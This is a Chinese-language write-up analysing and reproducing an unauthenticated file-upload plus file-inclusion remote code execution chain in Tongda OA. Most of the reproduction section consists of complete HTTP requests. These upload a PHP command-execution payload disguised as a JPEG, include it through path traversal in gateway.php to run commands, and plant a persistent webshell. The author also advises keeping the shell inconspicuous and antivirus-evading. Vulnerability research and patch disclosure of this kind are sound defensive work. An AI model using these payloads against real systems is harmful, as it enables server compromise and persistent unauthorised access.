            } else {
                if ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) {
                    $ERROR_DESC = sprintf(_('文件[%s]的大小超过了系统限制（%s）'), $ATTACH_NAME, ini_get('upload_max_filesize'));
                } else {
                    if ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) {
                        $ERROR_DESC = sprintf(_('文件[%s]的大小超过了表单限制'), $ATTACH_NAME);
                    } else {
                        if ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) {
                            $ERROR_DESC = sprintf(_('文件[%s]上传不完整'), $ATTACH_NAME);
                        } else {
                            if ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) {
                                $ERROR_DESC = sprintf(_('文件[%s]上传失败：找不到临时文件夹'), $ATTACH_NAME);
                            } else {
                                if ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) {
                                    $ERROR_DESC = sprintf(_('文件[%s]写入失败'), $ATTACH_NAME);
                                } else {
                                    $ERROR_DESC = sprintf(_('未知错误[代码：%s]'), $ATTACH_ERROR);
                                }
                            }
                        }
                    }
                }
            }
            if ($ERROR_DESC != '') {
                if (!$OUTPUT) {
                    delete_attach($ATTACHMENTS['ID'], $ATTACHMENTS['NAME'], $MODULE);
                    return $ERROR_DESC;
                } else {
                    Message(_('错误'), $ERROR_DESC);
                }
            }
        }
        return $ATTACHMENTS;
    }
之后在上面的代码中，调用了当前文件下的is_uploadable()函数对文件名进行检查：  
从上面的代码中可以看到，这里首先对文件名进行了检查，当文件名中不存在"."时会直接以现有的文件名来作为EXT_NAME,如果存在则从.开始匹配3位，判断后缀是否为php,如果为php则返回false,否则将"."之前的作为EXT_NAME。  
因为通达OA一般都是搭建在Windows系列下，所以我们这里可以有两个思路：
  * 上传一个以.php.为后缀的webshell文件（很可惜，上传后文件不再web工作目录下，没法直接使用，后面有介绍）
  * 上传一个图片木马文件，之后寻找一个文件包含漏洞来包含该图片木马文件，实现远程RCE  
当然，这里确实还存在一个文件包含漏洞，下面进行简要分析~
### 文件包含功能
文件包含功能的文件位于——webroot\ispirit\interface\gateway.php，具体代码如下：
     $val) {
            if ($key == 'data') {
                $val = (array) $val;
                foreach ($val as $keys => $value) {
                    ${$keys} = $value;
                }
            }
            if ($key == 'url') {
                $url = $val;
            }
        }
        if ($url != '') {
            if (substr($url, 0, 1) == '/') {
                $url = substr($url, 1);
            }
            if (strpos($url, 'general/') !== false || strpos($url, 'ispirit/') !== false || strpos($url, 'module/') !== false) {
                include_once $url;
            }
        }
        exit;
    }
上面的逻辑较为简单，可以直接看到，如果这里不传递参数P那么就可以绕过前面一系列的检测直接进入到下面的if语句中，之后从json中获取url参数的值，之后判断general/、ispirit/、module/是否在url内，如果不在直接跳过下面的include_once
$url,如果存在则包含指定URL的文件，这也是后期构造文件包含payload的一个重要信息点。
综上所述，我们总结如下：
  * 文件上传功能：传递参数P或参数P的值不为空即可绕过身份认证，且DEST_UID不为空，同时不能是以php为后缀的文件
  * 文件包含功能：不传递参数P即可绕过前期的一系列检查，同时json格式的url请求数据中需要包含general/、ispirit/、module/三者中的一个  
由上面的简易分析，可知，我们这里可以先上传一个图片木马文件，之后再使用文件包含功能包含该图片木马来实现远程RCE,下面来复现该漏洞~
## 漏洞复现
### 环境搭建
通达OA的安装包下载地址如下：  
链接：  
提取码：ousi  
下载之后直接运行exe文件进行安装即可，但是要确保本地的80端口未被占用~
### 漏洞复现
#### 命令执行
这里可以先自我编写一个文件上传页面，之后使用burpsuite抓包来获取一个文件上传特征的数据包，也可以通过upload-labs来实现，笔者这里正好有upload-labs的环境就直接使用了，之后修改请求数据包，这里需要注意的是参数UPLOAD_MODE、P、DEST_UID、filename的构造，完整的请求包如下：
    POST /ispirit/im/upload.php HTTP/1.1
    Host: 192.168.174.159:80
    Content-Length: 655
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="UPLOAD_MODE"
    2
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="P"
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="DEST_UID"
    1
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
    Content-Type: image/jpeg
    exec("cmd /c ".$command);
    $stdout = $exec->StdOut();
    $stroutput = $stdout->ReadAll();
    echo $stroutput;
    ?>
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3--    
之后在burpsuite中释放数据包，做文件上传测试，发现可以成功上传文件：  
PS：如果这里在上传文件时有文件名，需要注意上传后的文件名格式为“序列.文件名.jpg”，我这里为了方便就直接设置文件名为jpg了，且不包含"."，这一点在之前代码分析时已经说过原因了~  
之后进行文件包含，并执行命令，构造请求包如下：
    POST /ispirit/interface/gateway.php HTTP/1.1
    Host: 192.168.174.159
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 69
    json={"url":"/general/../../attach/im/2003/354900984.jpg"}&cmd=whoami
由此可见，文件包含+文件上传==>命令执行成功实现！
#### POC验证
#### GetShell
同时，我们也可以写shell文件进去，下面试试看~  
首先，构造上传的图片木马文件内容如下：
    POST /ispirit/im/upload.php HTTP/1.1
    Host: 192.168.174.159:80
    Content-Length: 602
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="UPLOAD_MODE"
    2
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="P"
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="DEST_UID"
    1
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3
    Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
    Content-Type: image/jpeg
    ------WebKitFormBoundaryBwVAwV3O4sifyhr3--    
之后释放数据包，上传文件：  
之后包含文件：
    POST /ispirit/interface/gateway.php HTTP/1.1
    Host: 192.168.174.159
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 59
    json={"url":"/general/../../attach/im/2003/1153189608.jpg"}
之后在服务器端成功写入webshell——404.php（shell名称自我定义即可，设置成那种不显眼且不容易发现的，同时shell能是免杀的那种最好）  
之后使用菜刀连接  
成功连接到shell  
#### EXP验证
附加测试：  
之前说过在Windows下可以使用.php.来绕过之前的上传文件中对php的匹配检测，这里简单的演示一下：  
上传之后可以看到目录下的文件名.shell.php的生成，但是很可惜的是web的工作目录在webroot下，所以没法直连，这里还是需要借助文件包含，上面的只是做了一个在Windows下如何绕.php后缀的检测方法，如果要真的使用还是需要在shell文件中通过文件读写来新建404.php后门才好，而不是和上面一样直接写一句话进去：  
同时，之前也想过日志文件+文件包含来RCE或者getshell，但是发现日志文件好像只记录一些启动的模块，暂未发现可用的途径
## POC&EXP
POC&EXP:   
PS: EXP中的shell路径需要根据具体的版本来做改动
## 漏洞修复
更新补丁：  
V11版：  
2017版：  
2016版：  
2015版：  
2013增强版：  
2013版：
## 参考链接